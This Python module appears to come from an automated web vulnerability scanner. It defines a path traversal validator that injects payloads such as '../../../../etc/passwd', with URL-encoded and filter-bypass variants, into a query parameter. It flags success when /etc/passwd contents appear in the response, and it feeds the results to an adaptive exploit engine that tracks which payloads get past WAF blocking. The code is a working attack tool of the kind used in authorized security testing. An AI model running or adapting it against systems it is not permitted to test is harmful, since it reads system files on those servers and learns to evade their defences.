"""Path traversal validator (alias for LFI-style checks).

Provides additional payloads focused on directory traversal and encodings.
It uses the same safe detection approach as `lfi_validator` and records
reward signals to the adaptive engine. Treats confirmed findings the same
as `lfi`: presence of common file markers (e.g., ``root:``) in responses.
"""
from __future__ import annotations

import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp

from core.adaptive_exploit_engine import AdaptiveExploitEngine, compute_reward
from .registry import register
from core.local_payload_engine import suggest_payloads

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "....//....//....//etc/passwd",
]

SIGNATURES = ("root:", "daemon:", "nobody:")


async def _fetch(session: aiohttp.ClientSession, url: str) -> tuple[float, int, str]:
    start = time.monotonic()
    try:
        async with session.get(url, timeout=20) as response:
            body = await response.text(errors="ignore")
            return time.monotonic() - start, response.status, body
    except Exception:
        return 999.0, 0, ""


@register("path_traversal")
async def validate_path_traversal(url: str, param: str, timeout: int = 20) -> dict | None:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    _engine = AdaptiveExploitEngine()

    qs[param] = ["test"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    async with aiohttp.ClientSession() as session:
        baseline_time, _, baseline_body = await _fetch(session, baseline_url)

        payloads = suggest_payloads("path_traversal", n=15) or PAYLOADS
        for payload in payloads:
            qs[param] = [payload]
            test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            response_time, status_code, body = await _fetch(session, test_url)
            waf = "blocked" if "blocked" in body.lower() or "ray id" in body.lower() else "unknown"

            if any(sig in body for sig in SIGNATURES):
                _engine.record_result(payload, "path_traversal", reward=1.0, waf=waf, tech=[])
                return {
                    "validated": True,
                    "type": "Path Traversal",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "Local file disclosure signature matched",
                }

            reward = 0.0 if waf == "blocked" else compute_reward(
                validated=False,
                response_time=response_time,
                baseline_time=baseline_time,
                response_body=body,
                baseline_body=baseline_body,
                status_code=status_code,
                waf_blocked=False,
                payload=payload,
            )
            _engine.record_result(payload, "path_traversal", reward=reward, waf=waf, tech=[])

    return None
